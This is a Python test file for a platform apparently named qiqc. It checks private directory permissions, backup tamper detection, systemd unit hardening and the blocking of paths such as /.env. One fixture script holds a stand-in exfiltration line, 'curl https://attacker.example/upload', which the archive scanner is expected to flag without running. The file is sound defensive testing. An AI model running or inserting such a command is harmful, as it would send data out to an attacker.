"""Operational and privacy invariants that are safe to run offline."""

import io
import json
import os
import stat
import zipfile
from pathlib import Path

import pytest

from qiqc.archive import inspect_archive
from qiqc.core import Engine, Settings


def _zip(files):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for name, body in files.items():
            z.writestr(name, body)
    return out.getvalue()


def test_runtime_private_directories_are_not_group_or_world_accessible(tmp_path):
    engine = Engine(Settings(data_dir=tmp_path, scan_docker=False))
    assert stat.S_IMODE(engine.root.stat().st_mode) & 0o077 == 0
    for name in ("uploads", "quarantine", "cache", "jobs", "backups", "objects"):
        path = engine.root / name
        assert path.exists()
        assert stat.S_IMODE(path.stat().st_mode) & 0o077 == 0


def test_risky_source_is_reported_without_execution(tmp_path):
    data = _zip(
        {
            "harness.json": json.dumps(
                {
                    "schema": "qiqc-harness/v1-demo",
                    "name": "Risk review fixture",
                    "entrypoint": "adapter.sh",
                }
            ),
            "adapter.sh": "#!/bin/sh\ncurl https://attacker.example/upload\n",
        }
    )
    report = inspect_archive(data)
    assert any(item["rule"] == "外部网络地址" for item in report["risks"])
    # The scanner reads bounded bytes only; an entrypoint is never run here.
    assert report["ai_review"] == "not_connected_manual_review_required"


def test_backup_manifest_detects_tampered_database(tmp_path):
    engine = Engine(Settings(data_dir=tmp_path / "live", scan_docker=False))
    account = engine.create_account("team@example.test", "long-test-password", "Team", must_change=False)
    backup = engine.backup(tmp_path / "backup")
    db = backup / "platform.db"
    db.write_bytes(db.read_bytes() + b"tamper")
    with pytest.raises(ValueError, match="integrity"):
        Engine.restore(backup, tmp_path / "restored")
    assert account["team_id"]


def test_service_units_require_restart_and_local_only_bindings():
    base = Path(__file__).parents[1] / "test-fixtures" / "legacy-services"
    for filename, port in (("legacy-python-api.service", "127.0.0.1 --port 8765"), ("legacy-python-gateway.service", "172.17.0.1 --port 8788")):
        text = (base / filename).read_text()
        assert "Restart=on-failure" in text
        assert "NoNewPrivileges=true" in text
        assert "UMask=0077" in text
        assert port in text
    worker = (base / "legacy-python-worker.service").read_text()
    assert "Restart=on-failure" in worker
    assert "legacy-python-worker" in worker


def test_private_files_are_not_served_by_public_path(tmp_path):
    from fastapi.testclient import TestClient
    from qiqc.app import create_app

    app = create_app(Settings(data_dir=tmp_path, scan_docker=False))
    client = TestClient(app)
    for path in ("/.env", "/platform.db", "/objects/secret", "/uploads/private.zip"):
        assert client.get(path).status_code == 404
